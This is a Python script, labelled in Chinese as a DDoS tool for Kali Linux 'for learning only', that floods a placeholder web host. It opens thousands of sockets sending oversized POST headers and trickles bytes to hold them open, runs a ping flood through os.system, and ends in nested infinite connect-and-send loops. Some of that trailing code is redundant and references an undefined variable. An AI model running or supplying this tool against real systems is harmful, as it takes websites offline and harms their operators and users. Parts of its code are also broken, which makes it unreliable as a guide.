# DDOS
#基于python，kali Liunx实现DDOS攻击
#仅供学习使用
import socket
import time
import threading
#Pressure Test,ddos tool

#---------------替换目标HOST------------#
MAX_CONN=20000
PORT=80
HOST="IP地址"
PAGE="/index.php"


buf=("POST %s HTTP/1.1\r\n"
"Host: %s\r\n"
"Content-Length: 10000000\r\n"
"Cookie: dklkt_dos_test\r\n"
"\r\n" % (PAGE,HOST))
import os
os.system("ping -n 100 -l 100 " + HOST)
socks=[]
def ddos():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    while 1:
        s.connect((HOST,PORT))
        s.send(buf.encode())
        s.send(buf.encode())
        s.send(buf.encode())

def conn_thread():
    global socks
    for i in range(0,MAX_CONN):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((HOST,PORT))
            s.send(buf.encode())
            s.send(buf.encode())
            s.send(buf.encode())
            print ("Send buf OK!,conn=%d\n"%i)
            socks.append(s)
        except Exception as ex:
            print ("Could not connect to server or send error:%s"%ex)
            time.sleep(0.1)
#end def

def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f".encode())
                #print "send OK!"
            except Exception as ex:
                print ("Send Exception:%s\n"%ex)
                socks.remove(s)
                s.close()
        time.sleep(0.1)
#end def

conn_th=threading.Thread(target=conn_thread,args=())
send_th=threading.Thread(target=send_thread,args=())

conn_th.start()
send_th.start()
ddos()
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
while 1:
    s.connect((HOST,PORT))
    s.send(buf.encode())
    s.send(buf.encode())
    s.send(buf.encode())
    print ("Send buf OK!,conn=%d\n"%i)
    while 1:
        s.connect((HOST,PORT))
        s.send(buf.encode())
        s.send(buf.encode())
        s.send(buf.encode())
        print ("Send buf OK!,conn=%d\n"%i)
        while 1:
            s.connect((HOST,PORT))
            s.send(buf.encode())
            s.send(buf.encode())
            s.send(buf.encode())
            print ("Send buf OK!,conn=%d\n"%i)
            while 1:
                s.connect((HOST,PORT))
                s.send(buf.encode())
                s.send(buf.encode())
                s.send(buf.encode())
                print ("Send buf OK!,conn=%d\n"%i)
                while 1:
                    s.connect((HOST,PORT))
                    s.send(buf.encode())
                    s.send(buf.encode())
                    s.send(buf.encode())
                    print ("Send buf OK!,conn=%d\n"%i)
                    while 1:
                            s.connect((HOST,PORT))
                            s.send(buf.encode())
                            s.send(buf.encode())
                            s.send(buf.encode())
                            print ("Send buf OK!,conn=%d\n"%i)


